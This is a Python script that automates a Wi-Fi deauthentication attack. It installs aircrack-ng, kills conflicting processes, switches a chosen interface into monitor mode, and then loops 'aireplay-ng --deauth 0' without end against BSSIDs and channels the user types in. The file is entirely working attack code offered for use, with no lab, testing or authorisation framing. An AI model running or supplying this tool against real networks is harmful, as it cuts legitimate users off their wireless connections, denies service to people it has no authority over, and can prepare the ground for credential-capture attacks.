import subprocess
import os
import signal
import sys
import time

# Colors for terminal output
RED = "\033[31m"
CYAN = "\033[36m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
ENDCOLOR = "\033[0m"

def print_color_text(color, text):
    print(f"{color}{text}{ENDCOLOR}")

def check_root_permissions():
    """Ensure the script is run as root."""
    if os.geteuid() != 0:
        print_color_text(RED, "You must run this script with root privileges.")
        sys.exit(1)

def install_package(package_name):
    """Install the required package if it's not already installed."""
    print_color_text(YELLOW, f"Checking if {package_name} is installed...")
    try:
        subprocess.run(["dpkg", "-s", package_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_color_text(GREEN, f"{package_name} is already installed.")
    except subprocess.CalledProcessError:
        print_color_text(YELLOW, f"Installing {package_name}...")
        subprocess.run(["apt-get", "update"], check=True)
        subprocess.run(["apt-get", "install", "-y", package_name], check=True)

def kill_conflicting_processes():
    """Kill processes that interfere with monitor mode."""
    print_color_text(YELLOW, "Killing conflicting processes...")
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        print_color_text(GREEN, "Conflicting processes killed.")
    except subprocess.CalledProcessError:
        print_color_text(RED, "Failed to kill conflicting processes.")
        sys.exit(1)

def start_monitor_interface(interface):
    """Start monitor mode on the specified wireless interface."""
    print_color_text(YELLOW, f"Starting monitor mode on {interface}...")
    try:
        result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True, check=True)
        # Extract monitor interface name from airmon-ng output
        for line in result.stdout.splitlines():
            if "monitor mode vif enabled for" in line:
                monitor_interface = line.split()[-1].replace(')', '')  # Remove any trailing ')' from interface name
                monitor_interface = monitor_interface.replace('[phy0]', '')  # Ensure no '[phy0]' is included
                print_color_text(GREEN, f"Monitor mode enabled on {monitor_interface}.")
                return monitor_interface
        print_color_text(RED, "Failed to determine monitor mode interface name.")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print_color_text(RED, f"Failed to start monitor mode: {e.stderr}")
        sys.exit(1)

def stop_monitor_interface(interface):
    """Stop monitor mode and revert to managed mode."""
    print_color_text(YELLOW, f"Stopping monitor mode on {interface}...")
    try:
        subprocess.run(["airmon-ng", "stop", interface], check=True)
        print_color_text(GREEN, f"Reverted {interface} to managed mode.")
    except subprocess.CalledProcessError:
        print_color_text(RED, "Failed to stop monitor mode.")
        sys.exit(1)

def deauth_target(bssid, channel, interface):
    """Perform a deauthentication attack on a target BSSID."""
    print_color_text(YELLOW, f"Setting channel {channel} for {interface}...")
    # Show the final command for setting the channel before running it
    channel_command = f"iw dev {interface} set channel {channel}"
    print_color_text(CYAN, f"Command: {channel_command}")
    try:
        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], check=True)
        print_color_text(GREEN, f"Channel set to {channel}.")
    except subprocess.CalledProcessError:
        print_color_text(RED, f"Failed to set channel {channel} on {interface}.")
        sys.exit(1)

    print_color_text(YELLOW, f"Deauthenticating BSSID {bssid} on {interface}...")
    # Show the final command for deauthentication before running it
    deauth_command = f"aireplay-ng --deauth 0 -a {bssid} {interface}"
    print_color_text(CYAN, f"Command: {deauth_command}")
    try:
        # Run the command indefinitely until Ctrl+C is pressed
        while True:
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
            time.sleep(1)  # Wait for a second before retrying
    except KeyboardInterrupt:
        print_color_text(RED, "Script interrupted by user.")
        stop_monitor_interface(interface)
        sys.exit(0)

def deauth_multiple_targets(bssid_list, channel_list, interface):
    """Perform deauthentication attacks on multiple BSSIDs."""
    if len(bssid_list) != len(channel_list):
        print_color_text(RED, "The number of BSSIDs and channels must match.")
        sys.exit(1)

    for bssid, channel in zip(bssid_list, channel_list):
        deauth_target(bssid, channel, interface)

def cleanup(interface):
    """Clean up by stopping the monitor interface."""
    stop_monitor_interface(interface)
    print_color_text(GREEN, "Cleanup complete. Goodbye!")
    sys.exit(0)

def main():
    check_root_permissions()
    install_package("aircrack-ng")

    # Kill conflicting processes
    kill_conflicting_processes()

    # Start monitor mode
    print_color_text(CYAN, "Available wireless interfaces:")
    subprocess.run(["iwconfig"], check=False)

    interface = input("Enter your wireless interface: ").strip()
    monitor_interface = start_monitor_interface(interface)

    try:
        print_color_text(YELLOW, "Enter targets for deauthentication (BSSID, Channel). Enter 'done' when finished.")
        bssid_list = []
        channel_list = []

        while True:
            bssid = input("Enter BSSID (or 'done'): ").strip()
            if bssid.lower() == "done":
                break
            channel = input(f"Enter channel for {bssid}: ").strip()
            bssid_list.append(bssid)
            channel_list.append(channel)

        if bssid_list:
            deauth_multiple_targets(bssid_list, channel_list, monitor_interface)
        else:
            print_color_text(RED, "No targets provided. Exiting.")
            cleanup(monitor_interface)

    except KeyboardInterrupt:
        print_color_text(RED, "Script interrupted by user.")
        cleanup(monitor_interface)

if __name__ == "__main__":
    main()
